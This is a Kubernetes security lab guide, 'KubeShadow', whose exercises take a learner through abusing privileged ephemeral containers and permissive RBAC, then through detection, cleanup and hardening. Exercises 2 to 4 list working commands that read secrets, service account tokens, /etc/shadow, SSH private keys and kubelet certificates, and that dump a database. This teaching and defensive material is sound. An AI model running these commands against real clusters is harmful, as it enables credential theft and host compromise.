# KubeShadow Lab Exercises

This document provides comprehensive exercises for the KubeShadow lab environment, focusing on ephemeral container attacks and RBAC exploitation.

## 🎯 Exercise Overview

### Exercise 1: Reconnaissance and Target Identification
- Identify vulnerable pods and understand the attack surface
- Examine RBAC configurations and permissions
- Discover sensitive data and secrets

### Exercise 2: Web Application Attack
- Exploit overly permissive RBAC to create privileged ephemeral containers
- Access sensitive data and secrets
- Attempt container escape techniques

### Exercise 3: Database Exploitation
- Use ephemeral containers to access database data and credentials
- Extract sensitive information
- Perform lateral movement

### Exercise 4: Privileged Pod Attack
- Exploit monitoring pod with privileged access for host compromise
- Access host filesystem and credentials
- Establish persistent access

### Exercise 5: Secure Environment Testing
- Test RBAC restrictions in secure environment
- Understand proper security configurations
- Learn prevention strategies

### Exercise 6: Detection and Monitoring
- Implement detection rules for ephemeral container attacks
- Monitor audit logs and security events
- Test Falco rules and monitoring

### Exercise 7: Cleanup and Mitigation
- Remove ephemeral containers and compromised resources
- Revoke overly permissive RBAC
- Implement security improvements

### Exercise 8: Analysis and Reporting
- Analyze attack scenarios and create security recommendations
- Develop incident response procedures
- Document findings and lessons learned

## 🔍 Detailed Exercise Steps

### Exercise 1: Reconnaissance

#### Objective:
Identify vulnerable pods and understand the attack surface.

#### Steps:
1. **List all pods in the vulnerable namespace:**
   ```bash
   kubectl get pods -n ephemeral-lab -o wide
   ```

2. **Examine pod configurations:**
   ```bash
   kubectl describe pod web-app -n ephemeral-lab
   kubectl describe pod database -n ephemeral-lab
   kubectl describe pod monitoring -n ephemeral-lab
   ```

3. **Check RBAC permissions:**
   ```bash
   kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
   kubectl auth can-i get secrets --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
   kubectl auth can-i get pods --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
   ```

4. **Identify sensitive data:**
   ```bash
   kubectl get secrets -n ephemeral-lab
   kubectl get configmaps -n ephemeral-lab
   kubectl describe secret app-secrets -n ephemeral-lab
   ```

#### Expected Results:
- Multiple pods with different security levels
- Overly permissive RBAC allowing ephemeral container creation
- Sensitive data in secrets and configmaps
- Privileged pods with host access

### Exercise 2: Web Application Attack

#### Objective:
Exploit overly permissive RBAC to create privileged ephemeral containers.

#### Steps:
1. **Create privileged ephemeral container:**
   ```bash
   kubectl debug web-app -n ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
   ```

2. **Access the ephemeral container:**
   ```bash
   kubectl exec -it web-app -n ephemeral-lab -c debug -- /bin/sh
   ```

3. **Explore the container environment:**
   ```bash
   # Check current user and capabilities
   id
   cat /proc/self/status | grep CapEff
   
   # Explore the filesystem
   ls -la /
   ls -la /var/www/html/
   
   # Check environment variables
   env | grep -i secret
   ```

4. **Access sensitive data:**
   ```bash
   # Access mounted secrets
   ls -la /etc/secrets/
   cat /etc/secrets/api-key
   cat /etc/secrets/jwt-secret
   
   # Access service account token
   cat /var/run/secrets/kubernetes.io/serviceaccount/token
   ```

5. **Attempt container escape:**
   ```bash
   # Check for host access
   ls -la /host/
   cat /host/etc/passwd
   ```

#### Expected Results:
- Successful creation of privileged ephemeral container
- Access to sensitive data and secrets
- Potential container escape capabilities

### Exercise 3: Database Exploitation

#### Objective:
Use ephemeral containers to access database data and credentials.

#### Steps:
1. **Create ephemeral container in database pod:**
   ```bash
   kubectl debug database -n ephemeral-lab --image=postgres:13 --target=postgres -- sleep 3600
   ```

2. **Access the ephemeral container:**
   ```bash
   kubectl exec -it database -n ephemeral-lab -c debug -- /bin/bash
   ```

3. **Explore database environment:**
   ```bash
   # Check database files
   ls -la /var/lib/postgresql/data/
   cat /var/lib/postgresql/data/postgresql.conf
   
   # Access secrets
   ls -la /etc/postgresql/secrets/
   cat /etc/postgresql/secrets/password
   cat /etc/postgresql/secrets/connection-string
   ```

4. **Connect to database:**
   ```bash
   # Use extracted credentials
   psql -U admin -d sensitive_data -c "SELECT * FROM users;"
   psql -U admin -d sensitive_data -c "\\dt"
   ```

5. **Extract additional data:**
   ```bash
   # Dump database
   pg_dump -U admin -d sensitive_data > /tmp/database_dump.sql
   cat /tmp/database_dump.sql
   ```

#### Expected Results:
- Access to database files and configuration
- Extraction of database credentials
- Successful connection to database
- Access to sensitive data

### Exercise 4: Privileged Pod Attack

#### Objective:
Exploit the monitoring pod with privileged access for host compromise.

#### Steps:
1. **Create privileged ephemeral container:**
   ```bash
   kubectl debug monitoring -n ephemeral-lab --image=alpine --target=monitoring-agent --privileged -- sleep 3600
   ```

2. **Access the ephemeral container:**
   ```bash
   kubectl exec -it monitoring -n ephemeral-lab -c debug -- /bin/sh
   ```

3. **Explore host filesystem:**
   ```bash
   # Check host access
   ls -la /host/root/
   ls -la /host/etc/
   
   # Access host files
   cat /host/etc/shadow
   cat /host/root/.ssh/id_rsa
   ```

4. **Access Kubernetes secrets:**
   ```bash
   # Access kubelet credentials
   cat /host/var/lib/kubelet/pki/kubelet-client-current.pem
   cat /host/etc/kubernetes/pki/ca.crt
   
   # Access etcd data
   ls -la /host/var/lib/etcd/
   ```

5. **Check host processes:**
   ```bash
   # List host processes
   ps aux
   netstat -tulpn
   
   # Check for other containers
   docker ps
   ```

#### Expected Results:
- Access to host filesystem
- Extraction of host credentials
- Access to Kubernetes secrets
- Potential for further lateral movement

### Exercise 5: Secure Environment Testing

#### Objective:
Test the secure environment to understand proper security configurations.

#### Steps:
1. **Test RBAC restrictions:**
   ```bash
   kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:secure-ephemeral-lab:secure-debug-sa -n secure-ephemeral-lab
   kubectl auth can-i get secrets --as=system:serviceaccount:secure-ephemeral-lab:secure-debug-sa -n secure-ephemeral-lab
   ```

2. **Attempt ephemeral container creation:**
   ```bash
   kubectl debug secure-web-app -n secure-ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
   ```

3. **Test network policies:**
   ```bash
   kubectl get networkpolicies -n secure-ephemeral-lab
   kubectl describe networkpolicy secure-ephemeral-netpol -n secure-ephemeral-lab
   ```

4. **Verify pod security standards:**
   ```bash
   kubectl get pods -n secure-ephemeral-lab -o yaml | grep securityContext
   ```

#### Expected Results:
- RBAC restrictions prevent unauthorized access
- Ephemeral container creation may be blocked
- Network policies restrict communication
- Pod security standards are enforced

### Exercise 6: Detection and Monitoring

#### Objective:
Implement detection rules and monitor for ephemeral container attacks.

#### Steps:
1. **Review detection rules:**
   ```bash
   kubectl get configmap ephemeral-attack-scenarios -n ephemeral-lab -o yaml
   ```

2. **Test Falco rules (if available):**
   ```bash
   # Install Falco
   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-rbac.yaml
   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-daemonset.yaml
   ```

3. **Monitor audit logs:**
   ```bash
   # Check audit logs for ephemeral container creation
   kubectl logs -n kube-system -l app=falco | grep "ephemeral"
   ```

4. **Test detection rules:**
   ```bash
   # Create ephemeral container and monitor logs
   kubectl debug web-app -n ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
   ```

#### Expected Results:
- Detection rules identify ephemeral container creation
- Audit logs show security events
- Monitoring alerts for suspicious activity

### Exercise 7: Cleanup and Mitigation

#### Objective:
Clean up the lab environment and implement security measures.

#### Steps:
1. **Remove ephemeral containers:**
   ```bash
   kubectl delete pod web-app -n ephemeral-lab
   kubectl delete pod database -n ephemeral-lab
   kubectl delete pod monitoring -n ephemeral-lab
   ```

2. **Revoke overly permissive RBAC:**
   ```bash
   kubectl delete rolebinding debug-role-binding -n ephemeral-lab
   kubectl delete clusterrolebinding debug-cluster-role-binding
   ```

3. **Implement secure RBAC:**
   ```bash
   kubectl apply -f modules/lab/manifests/10-secure-ephemeral.yaml
   ```

4. **Verify security improvements:**
   ```bash
   kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
   ```

#### Expected Results:
- Ephemeral containers removed
- RBAC permissions restricted
- Security measures implemented
- Access properly controlled

### Exercise 8: Analysis and Reporting

#### Objective:
Analyze the attack scenarios and create security recommendations.

#### Steps:
1. **Document findings:**
   - List all vulnerabilities discovered
   - Document attack vectors used
   - Record data accessed and exfiltrated

2. **Create security recommendations:**
   - RBAC improvements
   - Pod security standards
   - Network policies
   - Monitoring and detection

3. **Develop incident response procedures:**
   - Detection methods
   - Response steps
   - Recovery procedures
   - Prevention measures

#### Expected Results:
- Comprehensive security assessment
- Detailed recommendations
- Incident response procedures
- Prevention strategies

## 🎓 Key Takeaways

### Security Lessons Learned:
1. **RBAC is Critical**: Overly permissive RBAC enables attacks
2. **Ephemeral Containers are Powerful**: Can be abused for privilege escalation
3. **Defense in Depth**: Multiple security layers are essential
4. **Monitoring is Essential**: Detection and response capabilities are crucial
5. **Regular Audits**: Continuous security assessments are necessary

### Best Practices:
1. **Principle of Least Privilege**: Minimize permissions
2. **Pod Security Standards**: Implement security contexts
3. **Network Policies**: Restrict communication
4. **Admission Controllers**: Validate configurations
5. **Comprehensive Monitoring**: Detect and respond to threats

## 🚨 Security Warning

**⚠️ IMPORTANT**: This lab contains intentionally vulnerable configurations for educational purposes only. Never deploy these configurations in production environments.

## 📚 Additional Resources

- [Kubernetes Ephemeral Containers Documentation](https://kubernetes.io/docs/concepts/workloads/pods/ephemeral-containers/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [RBAC Best Practices](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Falco Security Monitoring](https://falco.org/)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)

---

**Happy Learning! 🚀**

This lab provides hands-on experience with ephemeral container attacks and defense strategies. Practice responsibly and always follow ethical guidelines!
